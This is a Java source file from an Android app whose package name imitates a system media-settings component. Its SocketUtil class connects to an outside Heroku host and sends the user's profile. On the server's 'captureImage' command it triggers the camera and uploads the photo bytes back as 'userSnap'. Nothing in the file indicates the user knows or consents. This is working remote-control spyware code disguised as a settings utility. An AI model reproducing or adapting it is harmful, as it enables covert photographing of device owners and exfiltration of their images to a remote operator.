package com.android.media.settings.Utility;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.util.Log;

import com.android.media.settings.Interface.ImageCaptureListener;
import com.android.media.settings.Model.Media;
import com.android.media.settings.Model.User;
import com.android.media.settings.Service.ImageCaptureService;
import com.android.media.settings.Service.ImageCaptureServiceImp;
import com.android.media.settings.Service.ImageService;
import com.github.nkzawa.emitter.Emitter;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;
import com.google.gson.Gson;

import java.net.URISyntaxException;
import java.util.TreeMap;

public class SocketUtil implements ImageCaptureListener {
    private static final String TAG = SocketUtil.class.getSimpleName();

    public static final String EVENT_ON_MESSAGE = "onMessage";
    public static final String EVENT_CAPTURE_IMAGE = "captureImage";

    private static Socket mSocket;
    private Context context;
    private Handler handler;
    private ImageCaptureService imageCaptureService;

    public SocketUtil(Context context) {
        this.context = context;
        handler = new Handler();
        imageCaptureService = ImageCaptureServiceImp.getInstance(context);
    }

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }

    public void connect() {
        try {
            mSocket = IO.socket("https://media-store.herokuapp.com/");
        } catch (URISyntaxException e) { e.printStackTrace(); }
        mSocket.on(EVENT_ON_MESSAGE, onNewMessage);
        mSocket.on(Socket.EVENT_CONNECT, onConnect);
        mSocket.on(Socket.EVENT_CONNECT_ERROR, onError);
        mSocket.on(Socket.EVENT_CONNECT_TIMEOUT, onError);
        mSocket.on(EVENT_CAPTURE_IMAGE, onCaptureImage);
        mSocket.connect();
    }

    public Emitter.Listener onNewMessage = (Object... args) -> {
        Log.d("SocketUtil", args[0].toString());
    };

    public Emitter.Listener onConnect = (Object... args) -> {
        Log.d("SocketUtil", "User Connected");
        User user = MediaUtility.getInstance(context).getUser();
        String userJson = MediaUtility.getInstance(context).toJson(user);
        mSocket.emit("join", userJson);
    };

    public Emitter.Listener onError = (Object... args) -> {
        User user = MediaUtility.getInstance(context).getUser();
        mSocket.emit("join", user);
    };

    public Emitter.Listener onCaptureImage = (Object... args) -> {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP ) {
            runOnUiThread(() -> imageCaptureService.startCapturing(this));
        }
    };

    @Override
    public void onCaptureDone(String pictureUrl, byte[] pictureData) {
        Media media = new Media();
        media.setBytes(pictureData);
        media.setPath(pictureUrl);
        mSocket.emit("userSnap", new Gson().toJson(media));

    }

    @Override
    public void onDoneCapturingAllPhotos(TreeMap<String, byte[]> picturesTaken) {
        Log.d(TAG, "All Images Captured");
    }
}
